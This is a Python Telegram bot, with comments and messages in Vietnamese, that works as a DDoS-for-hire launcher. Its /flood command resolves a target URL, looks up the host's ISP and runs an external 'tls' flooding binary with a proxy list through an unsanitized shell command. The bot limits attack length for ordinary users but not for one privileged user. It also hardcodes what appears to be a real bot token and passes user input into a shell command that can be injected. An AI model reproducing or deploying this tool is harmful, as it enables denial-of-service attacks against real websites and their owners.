import subprocess
import asyncio
import requests
import json
import socket
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse

# Cấu hình logging
logging.basicConfig(level=logging.INFO)

# Cấu hình
ALLOWED_CHAT_ID = -1002673143239  # ID nhóm được phép sử dụng bot
ALLOWED_USER_ID = 5622708943      # ID user được phép tấn công không giới hạn
token_input = '7567331917:AAHPY5MjMiWV8_1STW2q5Q7sbzGiAokpbio'  # Token bot

# Trạng thái
is_attacking = False
ongoing_info = {}

def escape_html(text):
    escape_characters = {
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#39;', '{': '&#123;', '}': '&#125;',
    }
    for char, escape in escape_characters.items():
        text = text.replace(char, escape)
    return text

def get_ip_from_url(url):
    try:
        split_url = parse.urlsplit(url)
        ip = socket.gethostbyname(split_url.netloc)
        return ip
    except socket.error as e:
        print(f"Không thể lấy IP từ URL: {str(e)}")
        return None

def get_isp_info(ip):
    try:
        print(f"Lấy thông tin ISP cho IP: {ip}")
        response = requests.get(f"http://ip-api.com/json/{ip}")
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Không thể lấy thông tin ISP: {str(e)}")
        return None

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking

    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("Bot chỉ hoạt động trong: https://t.me/NhanBbos. Vui lòng tham gia nhóm để sử dụng bot.")
        return

    if is_attacking:
        await update.message.reply_text("Chỉ cho phép 1 lệnh attack tại một thời điểm. Vui lòng đợi.")
        return

    try:
        url = context.args[0]
        time = int(context.args[1]) if len(context.args) > 1 else 60

        if time > 60 and update.effective_user.id != ALLOWED_USER_ID:
            await update.message.reply_text("Bạn chỉ được tấn công tối đa 60 giây.")
            return

        ip = get_ip_from_url(url)
        if not ip:
            await update.message.reply_text("Không thể lấy IP từ URL.")
            return

        isp_info = get_isp_info(ip)
        if isp_info:
            isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False)
            isp_info_text = escape_html(isp_info_text[:4000])  # Giới hạn độ dài
            user_name = update.effective_user.first_name or "Người dùng"
            await update.message.reply_text(
                f"Tấn công đã được gửi!\nThông tin ISP của host {escape_html(url)}\n<pre>{isp_info_text}</pre>\n🔥 Tấn công bởi: {escape_html(user_name)} 🔥",
                parse_mode='HTML'
            )

        is_attacking = True
        ongoing_info[update.effective_user.id] = {"url": url, "time_left": time}

        # Chạy tiến trình bằng screen
        subprocess.Popen(
            f"screen -dmS tls bash -c 'chmod 777 * && ./tls {url} {time} 64 5 proxy.txt'",
            shell=True
        )

        for remaining in range(time, 0, -1):
            ongoing_info[update.effective_user.id]["time_left"] = remaining
            await asyncio.sleep(1)

        # Kết thúc screen
        subprocess.call(["screen", "-S", "tls", "-X", "quit"])

        await update.message.reply_text(f"✅ Đã hoàn thành tấn công: {escape_html(url)}")

    except IndexError:
        await update.message.reply_text("Vui lòng nhập đúng cú pháp: /bypass hoặc /flood (url) (time)")

    except ValueError:
        await update.message.reply_text("Thời gian phải là một số nguyên.")

    except Exception as e:
        await update.message.reply_text(f"Đã xảy ra lỗi: {str(e)}")

    finally:
        is_attacking = False
        ongoing_info.pop(update.effective_user.id, None)

async def ongoing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("Bot chỉ hoạt động trong nhóm được chỉ định.")
        return

    if update.effective_user.id in ongoing_info:
        info = ongoing_info[update.effective_user.id]
        await update.message.reply_text(f"⏳ Đang tấn công {escape_html(info['url'])}, còn lại {info['time_left']} giây.")
    else:
        await update.message.reply_text("Không có cuộc tấn công nào đang diễn ra.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("Bot chỉ hoạt động trong nhóm được chỉ định.")
        return

    help_info = {
        "/ongoing": "Kiểm tra trạng thái tấn công hiện tại.",
        "/bypass": "[url] [time] -- Gửi tấn công Bypass.",
        "/flood": "[url] [time] -- Gửi tấn công Flood.",
        "/help": "Hiển thị hướng dẫn lệnh."
    }
    help_text = escape_html(json.dumps(help_info, indent=2, ensure_ascii=False))
    await update.message.reply_text(f"<pre>{help_text}</pre>", parse_mode='HTML')

def main():
    application = ApplicationBuilder().token(token_input).build()

    application.add_handler(CommandHandler("flood", attack))
    application.add_handler(CommandHandler("ongoing", ongoing))
    application.add_handler(CommandHandler("help", help_command))

    print("🤖 Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
